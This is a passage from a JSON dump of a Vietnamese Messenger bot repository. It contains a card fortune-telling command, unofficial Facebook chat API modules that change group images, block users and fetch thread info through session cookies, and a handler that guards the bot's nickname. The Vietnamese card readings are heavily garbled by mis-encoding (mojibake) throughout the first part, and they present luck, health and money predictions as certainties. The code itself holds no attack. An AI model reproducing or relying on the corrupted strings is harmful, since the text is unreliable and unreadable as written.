nh·∫≠n kh√≥ khƒÉn.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 9 ‚ô• ƒê·ªÉ Th·∫ßy xem...Qu√¢n b√†i c·ªßa m∆° m·ªông, ∆∞·ªõc mong, ni·ªÅm hy v·ªçng. G·∫∑p qu√¢n 9 c∆° l√† ƒëi·ªÅm b√°o ∆∞·ªõc m∆° th√†nh hi·ªán th·ª±c con ·∫°. Th·∫ßy t√≠nh r·ªìi, con ch·ªâ c·∫ßn c·ªë g·∫Øng h·∫øt s·ª©c r·ªìi chuy·ªán g√¨ c≈©ng s·∫Ω ƒë·∫°t ƒë∆∞·ª£c. ∆Ø·ªõc mong ƒëau ƒë√°u trong l√≤ng, Ch·ªâ c·∫ßn ti·∫øn t·ªõi th√¨ kh√¥ng s·ª£ g√¨.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 9 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...ƒê·ªÉ Th·∫ßy xem‚Ä¶ Qu√¢n n√†y n√≥ mang ƒëi·ªÅm b√°o l√† con s·∫Øp c√≥ th∆∞∆°ng v·ª• m·ªõi, c√≥ th·ªÉ s·∫Ω ph·∫£i ƒëi c√¥ng t√°c xa nh√†. Th·ªùi gian n√†y ch·∫Øc con s·∫Ω kh√° b·∫≠n r·ªôn, lu√¥n ch√¢n lu√¥n tay v√† c√≥ th·ªÉ ph·∫£i chuy·ªÉn n∆°i ·ªü m·ªôt th·ªùi gian.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 9 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Uhmm, qu√¢n n√†y mang ƒëi·ªÅm b√°o th√†nh c√¥ng. N·∫øu m√† con ch∆∞a k·∫øt h√¥n th√¨ Th·∫ßy nghƒ© r·∫•t c√≥ th·ªÉ l√† con s·∫Øp c∆∞·ªõi con nh√† ƒë·∫°i gia con ·∫°, kh√¥ng th√¨ ng∆∞·ªùi y√™u con c≈©ng s·∫Øp tr√∫ng s·ªë l·ªõn ƒë·∫•y. Ngo√†i ra th√¨ n√≥ c≈©ng b√°o r·∫±ng con s·∫Øp g·∫∑p c·ªßa tr·ªùi cho, ti·ªÅn b·∫°c t·ª´ ƒë√¢u r∆°i xu·ªëng.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 9 ‚ô† ƒê·ªÉ Th·∫ßy xem...Uhmm, ch√≠n b√≠ch kh√¥ng ph·∫£i l√† qu√¢n b√†i t·ªët l√†nh cho l·∫Øm con ·∫°. Th·ªùi ƒëi·ªÉm n√†y c√≥ th·ªÉ n√≥i l√† v·∫≠n h·∫°n c·ªßa con ƒëang ƒë·∫øn, th·∫ø n√™n Th·∫ßy khuy√™n con n√™n gi·ªØ g√¨n s·ª©c kh·ªèe, c·∫©n th·∫≠n ƒë∆∞·ªùng x√°, kh√¥ng ti√™u nhi·ªÅu ti·ªÅn. R·ªìi m·∫•y h√¥m n·ªØa ƒëi·ªÅm d·ªØ n√≥ b∆°n b·ªõt ƒëi th√¨ con s·∫Ω l·∫°i v√¥ t∆∞ th√¥i con ·∫°. Th·∫ßy ch√∫c con may m·∫Øn nhi·ªÅu h∆°n.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 10 ‚ô• ƒê·ªÉ Th·∫ßy xem...·∫§y, qu√¢n b√†i n√†y t∆∞·ª£ng tr∆∞ng cho may m·∫Øn v√† th√†nh c√¥ng con ·∫°. G·∫∑p qu√¢n 10 c∆° th√¨ ƒë√≠ch th·ªã l√† ho·∫°n n·∫°n s·∫Ω v∆∞·ª£t qua, phong ba l√† con mu·ªói. N·∫øu v·ª´a g·∫∑p kh√≥ khƒÉn vi·ªác g√¨ th√¨ con c·ª© y√™n t√¢m l√† s·∫Ω ·ªïn. L√†m ƒÉn, h·ªçc h√†nh, c√¥ng danh s·ª± nghi·ªáp s·∫Ω t·∫•n t·ªõi. M∆∞·ªùi c∆° l√† d·∫•u ƒëi·ªÅm l√†nh, Kh√≥ khƒÉn ƒë·∫øn m·∫•y c≈©ng gi√†nh v·∫ª vang. D·∫´u cho c∆° s·ª± tan t√†nh, V∆∞·ª£t l√™n ph√∫t ch·ªëc tr·ªü th√†nh ƒë·∫°i gia.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 10 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...√Ä, qu√¢n b√†i t·ªët ƒë√¢y. Ch·∫•t r√¥ v·ªën t∆∞·ª£ng tr∆∞ng cho ti·ªÅn t√†i danh v·ªçng, ƒëi·ªÉm m∆∞·ªùi th∆∞·ªùng b√°o tin t·ªët ƒë·∫πp. G·∫∑p qu√¢n n√†y th√¨ Th·∫ßy nghƒ© l√† con s·∫Øp c√≥ thay ƒë·ªïi chuy·ªán ti·ªÅn b·∫°c, th∆∞·ªùng l√† t·ªët con ·∫°. Theo Th·∫ßy t√≠nh th√¨ t√∫i ti·ªÅn r·ªßng r·ªânh ƒë·∫øn n∆°i r·ªìi. Nh·ªõ chƒÉm ch·ªâ l√†m ƒÉn v√† t√≠nh to√°n chi ti√™u m·ªôt ch√∫t nh√©, c∆° h·ªôi ƒëang ƒë·∫øn ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 10 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Qu√¢n b√†i t·ªët con ·∫°. B√°o hi·ªáu l√†m ƒÉn may m·∫Øn th√†nh ƒë·∫°t. N·∫øu con ƒëi du l·ªãch hay l√†m ƒÉn xa nh√† b√¢y gi·ªù th√¨ r·∫•t c√≥ th·ªÉ s·∫Ω g·∫∑p ƒë∆∞·ª£c b·∫°n m·ªõi, n·∫øu ch∆∞a c√≥ ng∆∞·ªùi y√™u th√¨ c√≥ khi t√¨m ƒë∆∞·ª£c ng∆∞·ªùi y√™u ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 10 ‚ô† ƒê·ªÉ Th·∫ßy xem...Ch·∫πp, con m∆∞·ªùi b√≠ch n√†y kh√¥ng ƒë∆∞·ª£c t·ªët l·∫Øm con ·∫°. Con c√≥ ƒëi·ªÅu ∆∞u t∆∞, c√≥ th·ªÉ s·∫Ω nh·∫≠n ƒë∆∞·ª£c tin kh√¥ng t·ªët l·∫Øm. Th·∫ßy nghƒ© l√† th·ªùi gian n√†y con n√™n ngh·ªâ ng∆°i, th∆∞ gi√£n, ƒë·ª´ng qu√° lo l·∫Øng r·ªìi s·∫Ω ·ªïn th√¥i con ·∫°.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° A ‚ô• ƒê·ªÉ Th·∫ßy xem...Qu√¢n n√†y n√≥ b√°o ƒëi·ªÅm l√†nh v·ªÅ t√¨nh y√™u ƒë√≥ con. V·ªën dƒ© n√≥ l√† t∆∞·ª£ng tr∆∞ng cho gia ƒë√¨nh m·ªõi c·∫£ th∆∞ t√¨nh. B·∫Øt ƒë∆∞·ª£c qu√¢n n√†y th√¨ ki·ªÉu g√¨ th√¨ r·∫Øc r·ªëi mu·ªôn phi·ªÅn c≈©ng ƒë·ªÅu tan bi·∫øn, tin vui t·ªõi t·∫•p ƒë∆∞a v·ªÅ con ·∫°. N·∫øu m√† ch∆∞a c√≥ ai y√™u, g·∫∑p ngay ng∆∞·ªùi ·∫•y bu·ªïi chi·ªÅu h√¥m sau. N·∫øu m√† t√¨nh √°i u s·∫ßu, vi·ªác may s·∫Ω ƒë·∫øn r∆°i ƒë·∫ßu con ngay.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° A ‚ô¶ ƒê·ªÉ Th·∫ßy xem...√Ä, qu√¢n n√†y th∆∞·ªùng b√°o tin t·ªët con ·∫°. N√≥ t∆∞·ª£ng trung cho s·ª± thay ƒë·ªïi, m·ªôt th√¥ng ƒëi·ªáp t·ªët, th∆∞·ªùng l√† v·ªÅ ti·ªÅn b·∫°c. Th·∫ßy t√≠nh th√¨ c√≥ th·ªÉ con s·∫Øp ƒë∆∞·ª£c tƒÉng l∆∞∆°ng ƒë·∫•y. C·ª© c·ªë g·∫Øng h·ªçc h√†nh l√†m vi·ªác chƒÉm ch·ªâ nh√©, r·ªìi con s·∫Ω nh·∫≠n ƒë∆∞·ª£c tin vui s·ªõm th√¥i.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° A ‚ô£ ƒê·ªÉ Th·∫ßy xem...√Åi ch√†, con n√†y h√™n l·∫Øm con ·∫°. B·ªëc ƒë∆∞·ª£c qu√¢n n√†y Th·∫ßy nghƒ© con n√™n ƒë√°nh x·ªï s·ªë ƒëi. N√≥ b√°o hi·ªáu gi√†u sang, quy·ªÅn qu√Ω, c·ªßa c·∫£i ki·∫øm ƒë∆∞·ª£c b·∫•t ng·ªù. Nh∆∞ng m√† c√πng ph·∫£i nh·ªõ, c√°i g√¨ ƒë·∫øn nhanh th√¨ c√≥ th·ªÉ ƒëi c≈©ng nhanh l·∫Øm, con ph·∫£i bi·∫øt ti√™u pha c·∫©n th·∫≠n ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° A ‚ô† ƒê·ªÉ Th·∫ßy xem...Ch·∫≠c, qu√¢n n√†y xui l·∫Øm con ·∫°. Th·ªùi gian n√†y, con ph·∫£i ƒë·ªÅ ph√≤ng v·∫•n ƒë·ªÅ s·ª©c kh·ªèe c·ªßa b·∫£n th√¢n, gia ƒë√¨nh v√† ng∆∞·ªùi th√¢n. Chuy·ªán l√†m ƒÉn, h·ªçc h√†nh c≈©ng n√™n c·∫©n tr·ªçng. N√≥i chung kh√¥ng n√™n ƒëi ƒë√¢u xa. C·∫ßn ph·∫£i ch√∫ √Ω m·ªçi l√∫c m·ªçi n∆°i t·ª´ khi ƒëi ƒë∆∞·ªùng ƒë·∫øn khi l√™n gi∆∞·ªùng con ·∫°.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° J ‚ô• ƒê·ªÉ Th·∫ßy xem...Qu√¢n b√†i mang h√¨nh ng∆∞·ªùi b·∫°n t·ªët, ƒë√¥i khi √°m ch·ªâ m·ªôt ng∆∞·ªùi m·∫øn m·ªô tr·∫ª tu·ªïi. G·∫∑p qu√¢n b√†i n√†y, Th·∫ßy nghƒ© con s·∫Øp g·∫∑p ƒë∆∞·ª£c m·ªôt ng∆∞·ªùi c√≥ t√≠nh c√°ch r·∫•t hay ho, vui t√≠nh v√† th√¢n thi·ªán. Ng∆∞·ªùi n√†y c√≥ v·∫ª m·∫øn m·ªô con. N·∫øu con l√† n·ªØ gi·ªõi ƒëang mu·ªën c√≥ ng∆∞·ªùi y√™u, r·∫•t c√≥ th·ªÉ ƒë√¢y l√† c∆° h·ªôi t·ªët. N·∫øu l√† nam gi·ªõi, con s·∫Øp g·∫∑p m·ªôt ng∆∞·ªùi b·∫°n ch∆°i ƒë∆∞·ª£c. Ng∆∞·ªùi √°i m·ªô tr·∫ª tu·ªïi, Mang b√¥ng h·ªìng v√† c·∫£ tr√°i tim, G·∫∑p con m·ªôt ng√†y kh√¥ng ƒë·ª£i, L√† tri k·ªâ v√† c√≥ th·ªÉ t√¨nh y√™u.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° J ‚ô¶ ƒê·ªÉ Th·∫ßy xem...ƒê·ªÉ Th·∫ßy coi‚Ä¶ J R√¥ √†, m·ªôt ch√†ng trai tr·∫ª ch·ªânh t·ªÅ nh∆∞ng c≈©ng c√≥ th·ªÉ l√† m·ªôt con ng∆∞·ªùi ƒë·ªë k·ªµ kh√¥ng ƒë√°ng tin t∆∞·ªüng. Th·∫ßy t√≠nh th√¨ con s·∫Øp c√≥ ng∆∞·ªùi b√°o tin kh√¥ng ƒë∆∞·ª£c t·ªët l√†nh, nh∆∞ng m√† c≈©ng kh√¥ng c√≥ g√¨ quan tr·ªçng to t√°t l·∫Øm. Con n√™n t·ªânh t√°o khi nghe l·ªùi ng∆∞·ªùi kh√°c v√†o th·ªùi gian n√†y nh√©.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° J ‚ô£ ƒê·ªÉ Th·∫ßy xem...J nh√©p, m·ªôt ng∆∞·ªùi b·∫°n ngang tu·ªïi t√≠nh t√¨nh s·ªëc n·ªïi nh∆∞ng vui v·∫ª v√† t·ªët b·ª•ng. Th·∫ßy t√≠nh l√† con s·∫Øp c√≥ d·ªãp ƒëi ch∆°i vui v·∫ª r·ªìi, n·∫øu ch∆∞a c√≥ ng∆∞·ªùi y√™u th√¨ ƒë√¢y c≈©ng l√† c∆° h·ªôi t·ªët ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° J ‚ô† ƒê·ªÉ Th·∫ßy xem...Qu√¢n b√†i mang h√¨nh t∆∞·ª£ng c·ªßa m·ªôt k·∫ª th√π ƒë·ªãch v√† hay ghen t·ªã. Th·∫ßy nghƒ© l√† th·ªùi gian n√†y con n√™n c·∫£nh gi√°c h∆°n trong chuy·ªán ti·ªÅn nong c≈©ng nh∆∞ t√¨nh c·∫£m, ƒë·ªÅ ph√≤ng nh·ªØng k·∫ª ti·ªÉu nh√¢n ghen gh√©t, th√π ƒë·ªãch.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° K ‚ô• ƒê·ªÉ Th·∫ßy xem...A, qu√¢n n√†y n√≥ mang h√¨nh √¥ng gi√† t·ªët b·ª•ng, nghƒ©a hi·ªáp, th√¥ng th√°i, hi·ªÉu bi·∫øt. G·∫∑p qu√¢n b√†i n√†y b√°o ƒëi·ªÅm l√†nh r·∫±ng con c√≥ qu√Ω nh√¢n ph√π tr·ª£, gi√∫p ƒë·ª° con ngay c·∫£ khi con ch∆∞a c·∫ßn nh·ªù v·∫£ g√¨. Ch·ªù tin t·ªët nha con! √îng gi√† mang ƒë·∫øn tin vui, kh√≥ khƒÉn gi√∫p ƒë·ª° v·∫≠n xui s·∫ª c√πng. D·∫´u kh√≥ khƒÉn ƒë·∫øn mu√¥n tr√πng, c√≥ √¥ng gi√† b√©o ƒë·ª° c√πng v·ªõi con.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° K ‚ô¶ ƒê·ªÉ Th·∫ßy xem...Uhmm, Th·∫ßy xem n√†o‚Ä¶. Qu√¢n n√†y n√≥ mang h√¨nh m·ªôt ng∆∞·ªùi ƒë√†n √¥ng th·ªëng tr·ªã quy·ªÅn l·ª±c c·ªßa ƒê·∫•t, m·ªôt ng∆∞·ªùi ƒë·∫ßy quy·ªÅn l·ª±c, ƒë·ªãa v·ªã v√† ·∫£nh h∆∞·ªüng. B·ªëc ƒë∆∞·ª£c qu√¢n b√†i n√†y, con s·∫Ω s·ªõm c√≥ tin t·ªët l√†nh, th∆∞·ªùng l√† ƒë∆∞·ª£c thƒÉng ch·ª©c con ·∫°. Th·ªùi gian n√†y con n√™n ƒë·ªëi t·ªët v·ªõi c√°c s·∫øp tr√™n c≈©ng nh∆∞ ƒë·ªìng nghi·ªáp, s·∫Ω d·ªÖ c√≥ c∆° h·ªôi l·∫Øm ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° K ‚ô£ ƒê·ªÉ Th·∫ßy xem...Oh, qu√¢n n√†y mang h√¨nh m·ªôt √¥ng gi√† t·ªët b·ª•ng, h√†o s·∫£ng, nhi·ªát t√¨nh. Con s·∫Ω g·∫∑p ƒë∆∞·ª£c gi√∫p ƒë·ª° t·ª´ c·∫•p tr√™n, Th·∫ßy c√¥, b·ªë m·∫π hay h·ªç h√†ng ch√∫ b√°c ƒë·∫•y. Th·∫ßy nghƒ© c√≥ th·ªÉ l√† con s·∫Øp ƒë∆∞·ª£c vi·ªác l√†m m·ªõi c√≥ l∆∞∆°ng cao h∆°n, thƒÉng ch·ª©c hay ng∆∞·ªùi kh√°c cho ti·ªÅn.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° K ‚ô† ƒê·ªÉ Th·∫ßy xem...Uhm, Th·∫ßy xem n√†o.... Qu√¢n b√†i n√†y t∆∞·ª£ng tr∆∞ng cho ng∆∞·ªùi gi√†u tham v·ªçng v√† c√≥ th·ªÉ √≠ch k·ª∑. N√≥ l√† ƒëi·ªÅm b√°o cho con bi·∫øt ph·∫£i ƒë·ªÅ ph√≤ng k·∫ª ti·ªÉu nh√¢n tr√°nh s·ª± ghen gh√©t, bon chen. Con n√™n nh∆∞·ªùng nh·ªãn chuy·ªán nh·ªè, nh∆∞ng ƒë·ª´ng ƒë·ªÉ ai ƒë·ªông ƒë·∫øn quy·ªÅn l·ª£i c·ªßa m√¨nh.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° Q ‚ô• ƒê·ªÉ Th·∫ßy xem...Qu√¢n n√†y n√≥ mang h√¨nh ng∆∞·ªùi ƒë√†n b√† hi·ªÅn l√†nh, t·ªët b·ª•ng ƒë√≥ con ·∫°. Th·∫ßy nghƒ© l√† con s·∫Øp nh·∫≠n ƒë∆∞·ª£c nh·ªØng l·ªùi khuy√™n t·ªët t·ª´ m·ªôt ng∆∞·ªùi ph·ª• n·ªØ ·∫•m √°p v√† t√¨nh c·∫£m. ƒê√¥i l√∫c th√¨ con b√†i n√†y √°m ch·ªâ h√¨nh m·∫´u c·ªßa ng∆∞·ªùi m·∫π, ng∆∞·ªùi ch·ªã ho·∫∑c ng∆∞·ªùi b·∫°n t√¢m giao n·ªØ gi·ªõi. G·∫∑p ng∆∞·ªùi ph·ª• n·ªØ t·ªët t√¢m, l·∫Øng nghe l·ªùi n√≥i s·∫Ω l√†m con vui. N·∫øu m√† ƒëang g·∫∑p chuy·ªán xui, c√≥ ng∆∞·ªùi ph·ª• n·ªØ bi·∫øn xui h√≥a l√†nh. P/s: Nghe Th·∫ßy n√≥i n√†y, n·∫øu m√† con ƒëang mu·ªën c∆∞a ai √Ω, th√¨ ph·∫£i c∆∞a m·∫π, ch·ªã g√°i, em g√°i hay b·∫°n g√°i th√¢n c·ªßa ng∆∞·ªùi ta tr∆∞·ªõc nghe kh√¥ng, s·∫Ω l·ª£i ƒë·ªß ƒë∆∞·ªùng ƒë·∫•y con ·∫°.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° Q ‚ô¶ ƒê·ªÉ Th·∫ßy xem...√Ä, qu√¢n n√†y n√≥ mang h√¨nh m·ªôt ng∆∞·ªùi ph·ª• n·ªØ th·ªëng tr·ªã quy·ªÅn l·ª±c c·ªßa ƒê·∫•t, mang √Ω nghƒ©a l√† c√≥ chuy·ªán ƒëang x·∫£y ra con ·∫°. Tin ƒë·ªìn th√¨ hay th·∫•t thi·ªát, nh∆∞ng m√† c≈©ng ph·∫£i n√≥i r·∫±ng c√≥ l·ª≠a th√¨ m·ªõi c√≥ kh√≥i. Th·∫ßy nghƒ© l√† con n√™n tr√≤ chuy·ªán nhi·ªÅu h∆°n v·ªõi b·∫°n b√®, ƒë·ªìng nghi·ªáp m√† bi·∫øt ng∆∞·ªùi ta ƒëang b√†n t√°n c√°i g√¨, s·∫Ω c√≥ l·ª£i cho con.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° Q ‚ô£ ƒê·ªÉ Th·∫ßy xem...Oh, qu√¢n n√†y mang h√¨nh m·ªôt ph·ª• n·ªØ t·ªët b·ª•ng, nhi·ªát t√¨nh v√† c·ªüi m·ªü. Con s·∫Ω g·∫∑p ƒë∆∞·ª£c gi√∫p ƒë·ª° t·ª´ m·ªôt ng∆∞·ªùi ph·ª• n·ªØ ƒë·∫•y. Th·∫ßy nghƒ© c√≥ th·ªÉ l√† con s·∫Ω nh·∫≠n ƒë∆∞·ª£c m·ªôt l·ªùi khuy√™n b·ªï √≠ch t·ª´ ng∆∞·ªùi ·∫•y, nh·ªõ l·∫Øng nghe con nh√©.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° Q ‚ô† ƒê·ªÉ Th·∫ßy xem...Qu√¢n b√†i t∆∞·ª£ng tr∆∞ng cho m·ªôt g√≥a ph·ª• √°o ƒëen. M·ªôt qu√¢n b√†i nguy hi·ªÉm. Con ph·∫£i tr√°nh b·∫´y t√¨nh v√† ƒë·ªÅ ph√≤ng nh·ªØng k·∫ª chen ngang. Trong chuy·ªán t√¨nh c·∫£m, c·∫ßn ph·∫£i m·ªÅm m·ªèng nh∆∞ng t·ªânh t√°o. Trong c√¥ng vi·ªác, con ph·∫£i s√°ng su·ªët kh√¥ng quy·∫øt ƒë·ªãnh theo t√¨nh c·∫£m ri√™ng.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° JOKER ƒê·ªÉ Th·∫ßy xem...PhƒÉng teo. Qu√¢n b√†i c·ªßa s·ªë m·ªánh. N√≥ kh√¥ng ph·∫£i l√† m·ªôt ƒëi·ªÅm g·ªü c≈©ng nh∆∞ ƒëi·ªÅm l√†nh con ·∫°. √ù nghƒ©a c·ªßa n√≥ l√† chuy·ªán g√¨ ƒë·∫øn s·∫Ω ƒë·∫øn, n·∫øu con mong ch·ªù m·ªôt ƒëi·ªÅu g√¨ ƒë√≥ th√¨ c≈©ng kh√¥ng ph·∫£i s·ªït ru·ªôt. Th·∫ßy nghƒ© l√† con h√£y ƒë·ªÉ m·ªçi th·ª© t·ª± nhi√™n, ƒë·ª´ng g∆∞·ª£ng √©p.\"\n    ];\n    return api.sendMessage(`${data[Math.floor(Math.random() * data.length)]}`, event.threadID, event.messageID);\n}","path":null,"size_bytes":21535,"size_tokens":null},"lib/fca-auto/src/changeGroupImage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\nvar bluebird = require(\"bluebird\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  function handleUpload(image, callback) {\n    var uploads = [];\n\n    var form = {\n      images_only: \"true\",\n      \"attachment[]\": image\n    };\n\n    uploads.push(\n      defaultFuncs\n        .postFormData(\"https://upload.facebook.com/ajax/mercury/upload.php\", ctx.jar, form, {})\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          if (resData.error) throw resData;\n\n          return resData.payload.metadata[0];\n        })\n    );\n\n    // resolve all promises\n    bluebird\n      .all(uploads)\n      .then(resData => callback(null, resData))\n      .catch(function (err) {\n        log.error(\"handleUpload\", err);\n        return callback(err);\n      });\n  }\n\n  return function changeGroupImage(image, threadID, callback) {\n    if (!callback && (utils.getType(threadID) === \"Function\" || utils.getType(threadID) === \"AsyncFunction\")) throw { error: \"please pass a threadID as a second argument.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var messageAndOTID = utils.generateOfflineThreadingID();\n    var form = {\n      client: \"mercury\",\n      action_type: \"ma-type:log-message\",\n      author: \"fbid:\" + ctx.userID,\n      author_email: \"\",\n      ephemeral_ttl_mode: \"0\",\n      is_filtered_content: false,\n      is_filtered_content_account: false,\n      is_filtered_content_bh: false,\n      is_filtered_content_invalid_app: false,\n      is_filtered_content_quasar: false,\n      is_forward: false,\n      is_spoof_warning: false,\n      is_unread: false,\n      log_message_type: \"log:thread-image\",\n      manual_retry_cnt: \"0\",\n      message_id: messageAndOTID,\n      offline_threading_id: messageAndOTID,\n      source: \"source:chat:web\",\n      \"source_tags[0]\": \"source:chat\",\n      status: \"0\",\n      thread_fbid: threadID,\n      thread_id: \"\",\n      timestamp: Date.now(),\n      timestamp_absolute: \"Today\",\n      timestamp_relative: utils.generateTimestampRelative(),\n      timestamp_time_passed: \"0\"\n    };\n\n    handleUpload(image, function (err, payload) {\n      if (err) return callback(err);\n\n      form[\"thread_image_id\"] = payload[0][\"image_id\"];\n      form[\"thread_id\"] = threadID;\n\n      defaultFuncs\n        .post(\"https://www.facebook.com/messaging/set_thread_image/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function (resData) {\n          // check for errors here\n          if (resData.error) throw resData;\n          return callback();\n        })\n        .catch(function (err) {\n          log.error(\"changeGroupImage\", err);\n          return callback(err);\n        });\n    });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":3093,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeBlockedStatus.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeBlockedStatus(userID, block, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    defaultFuncs\n      .post(`https://www.facebook.com/messaging/${block ? \"\" : \"un\"}block_messages/`, ctx.jar, { fbid: userID })\n      .then(utils.saveCookies(ctx.jar))\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeBlockedStatus\", err);\n        return callback(err);\n      });\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1027,"size_tokens":null},"modules/events/antibd.js":{"content":"module.exports.config = {\n  name: \"antibd\",\n  eventType: [\"log:user-nickname\"],\n  version: \"0.0.1\",//beta\n  credits: \"ProCoderCyrus\",\n  description: \"Ch·ªëng ƒë·ªïi bi·ªát danh c·ªßa Bot\"\n};\n\nmodule.exports.run = async function({ api, event, Users, Threads }) {\n    var { logMessageData, threadID, author } = event;\n    var botID = api.getCurrentUserID();\n    var { BOTNAME, ADMINBOT } = global.config;\n    var { nickname } = await Threads.getData(threadID, botID);\n    var nickname = nickname ? nickname : `„Äé ${global.config.PREFIX} „Äè ‚™º ${global.config.BOTNAME}`;\n    if (logMessageData.participant_id == botID && author != botID && !ADMINBOT.includes(author) && logMessageData.nickname != nickname) {\n        api.changeNickname(nickname, threadID, botID)\n        var info = await Users.getData(author);\n       return api.sendMessage({ body: `${info.name} - ùêÅùêöÃ£ùêß ùêäùê°ùê®ÃÇùêßùê† ùêÇùê®ÃÅ ùêêùêÆùê≤ùêûÃÇÃÄùêß!!!`}, threadID);\n    }  \n}","path":null,"size_bytes":965,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getThreadInfo.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nvar utils = require(\"../utils\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      